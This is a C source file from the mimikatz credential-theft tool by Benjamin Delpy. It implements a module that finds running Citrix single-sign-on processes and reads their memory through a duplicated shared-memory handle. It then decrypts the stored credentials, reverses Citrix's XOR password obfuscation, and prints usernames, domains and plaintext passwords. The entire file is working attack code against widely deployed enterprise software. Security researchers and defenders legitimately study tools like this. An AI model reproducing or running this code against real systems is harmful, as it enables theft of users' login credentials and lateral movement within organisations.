/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_misc_citrix.h"

void kuhl_m_misc_citrix_logonpasswords(int argc, wchar_t* argv[])
{
	UNREFERENCED_PARAMETER(argc);
	UNREFERENCED_PARAMETER(argv);

	kull_m_process_getProcessInformation(Citrix_Each_SSO_Program, NULL);
}

DECLARE_CONST_UNICODE_STRING(_U_ssonsvr, L"ssonsvr.exe");
DECLARE_CONST_UNICODE_STRING(_U_wfcrun32, L"wfcrun32.exe");
DECLARE_CONST_UNICODE_STRING(_U_AuthManSvr, L"AuthManSvr.exe");
const PCUNICODE_STRING _U_CITRIX_SSO_PROGRAMS[] = { &_U_ssonsvr , &_U_wfcrun32 , &_U_AuthManSvr };
BOOL CALLBACK Citrix_Each_SSO_Program(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
{
	DWORD i, ProcessId;
	HANDLE hProcess;
	RTL_USER_PROCESS_PARAMETERS UserProcessParameters;
	KULL_M_MEMORY_ADDRESS aRemote = {NULL, NULL}, aBuffer = {&UserProcessParameters, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	PEB Peb;

	UNREFERENCED_PARAMETER(pvArg);

	for (i = 0; i < ARRAYSIZE(_U_CITRIX_SSO_PROGRAMS); i++)
	{
		if (RtlEqualUnicodeString(_U_CITRIX_SSO_PROGRAMS[i], &pSystemProcessInformation->ImageName, TRUE))
		{
			ProcessId = PtrToUlong(pSystemProcessInformation->UniqueProcessId);
			kprintf(L"\n* %wZ -- pid: %u\n", &pSystemProcessInformation->ImageName, ProcessId);
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE, FALSE, ProcessId);
			if(hProcess)
			{
				if (kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aRemote.hMemory))
				{
					if (kull_m_process_peb(aRemote.hMemory, &Peb, FALSE))
					{
						aRemote.address = Peb.ProcessParameters;
						if (kull_m_memory_copy(&aBuffer, &aRemote, sizeof(UserProcessParameters)))
						{
							aRemote.address = UserProcessParameters.CommandLine.Buffer;
							UserProcessParameters.CommandLine.Buffer = LocalAlloc(LPTR, UserProcessParameters.CommandLine.MaximumLength);
							aBuffer.address = UserProcessParameters.CommandLine.Buffer;

							if(UserProcessParameters.CommandLine.Buffer)
							{
								if (kull_m_memory_copy(&aBuffer, &aRemote, UserProcessParameters.CommandLine.MaximumLength))
								{
									Citrix_SSO_Program_args(aRemote.hMemory->pHandleProcess->hProcess, &UserProcessParameters.CommandLine);
								}
								LocalFree(UserProcessParameters.CommandLine.Buffer);
							}
						}
					}
					kull_m_memory_close(aRemote.hMemory);
				}
				CloseHandle(hProcess);
			}
			else PRINT_ERROR_AUTO(L"OpenProcess");

			break;
		}
	}

	return TRUE;
}

void Citrix_SSO_Program_args(HANDLE hRemoteProcess, PCUNICODE_STRING puCommandLine)
{
	int i, argc;
	LPWSTR* argv;
	HANDLE hRemoteFileMapping = NULL;

	argv = CommandLineToArgvW(puCommandLine->Buffer, &argc);
	if (argv)
	{
		if (argc > 0)
		{
			for (i = 0; i < argc; i++)
			{
				if (_wcsnicmp(argv[i], L"/HTC:", 5) == 0)
				{
					hRemoteFileMapping = (HANDLE)(ULONG_PTR)wcstoul(argv[i] + 5, NULL, 10);
					Citrix_SSO_Program_FileMapping(hRemoteProcess, hRemoteFileMapping);

					break;
				}
			}

			if (!hRemoteFileMapping)
			{
				kprintf(L"  No shared memory (no SSO enabled?)\n");
			}
		}
		else PRINT_ERROR(L"No command/module?");

		LocalFree(argv);
	}
	else PRINT_ERROR_AUTO(L"CommandLineToArgvW");
}

void Citrix_SSO_Program_FileMapping(HANDLE hRemoteProcess, HANDLE hRemoteFileMapping)
{
	HANDLE hFileMapping;
	PCITRIX_PACKED_CREDENTIALS pCitrixPackedCredentials;
	PCITRIX_CREDENTIALS pCitrixCredentials;
	NTSTATUS nStatus;

	if (DuplicateHandle(hRemoteProcess, hRemoteFileMapping, GetCurrentProcess(), &hFileMapping, FILE_MAP_READ, FALSE, 0))
	{
		pCitrixPackedCredentials = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, sizeof(CITRIX_PACKED_CREDENTIALS));
		if (pCitrixPackedCredentials)
		{
			//kprintf(L"cbStruct: 0x%08x - ref: 0x%08x\ncbData  : 0x%08x - ref: 0x%08x\ndwFlags : 0x%08x\n", pCitrixPackedCredentials->cbStruct, sizeof(CITRIX_PACKED_CREDENTIALS), pCitrixPackedCredentials->cbData, sizeof(CITRIX_CREDENTIALS), pCitrixPackedCredentials->dwFlags);
			pCitrixCredentials = LocalAlloc(LPTR, sizeof(pCitrixPackedCredentials->Data));
			if (pCitrixCredentials)
			{
				RtlCopyMemory(pCitrixCredentials, pCitrixPackedCredentials->Data, sizeof(pCitrixPackedCredentials->Data));
				nStatus = RtlDecryptMemory(pCitrixCredentials, sizeof(pCitrixPackedCredentials->Data), RTL_ENCRYPT_OPTION_CROSS_PROCESS); // CryptUnprotectMemory is not Windows XP friendly
				if (nStatus == STATUS_SUCCESS)
				{
					CitrixPasswordDesobfuscate((PBYTE)pCitrixCredentials->password, pCitrixCredentials->cbPassword);
					kprintf(L"| Username  : %s\n| Domain    : %s\n| Password  : %.*s\n| flags/type: 0x%08x\n", pCitrixCredentials->username, pCitrixCredentials->domain, pCitrixCredentials->cbPassword, pCitrixCredentials->password, pCitrixCredentials->dwFlags);
				}
				else PRINT_ERROR_NUMBER(L"RtlDecryptMemory", nStatus);

				LocalFree(pCitrixCredentials);
			}

			UnmapViewOfFile(pCitrixPackedCredentials);
		}
		else PRINT_ERROR_AUTO(L"MapViewOfFile");

		CloseHandle(hFileMapping);
	}
	else PRINT_ERROR_AUTO(L"DuplicateHandle");
}

void CitrixPasswordObfuscate(PBYTE pbData, DWORD cbData)
{
	DWORD i;
	BYTE prec;

	for (i = 0, prec = 0x00; i < cbData; i++)
	{
		pbData[i] ^= prec ^ 'C';
		prec = pbData[i];
	}
}

void CitrixPasswordDesobfuscate(PBYTE pbData, DWORD cbData)
{
	DWORD i;
	BYTE prec, sprec;

	for (i = 0, prec = 0x00; i < cbData; i++)
	{
		sprec = pbData[i];
		pbData[i] ^= prec ^ 'C';
		prec = sprec;
	}
}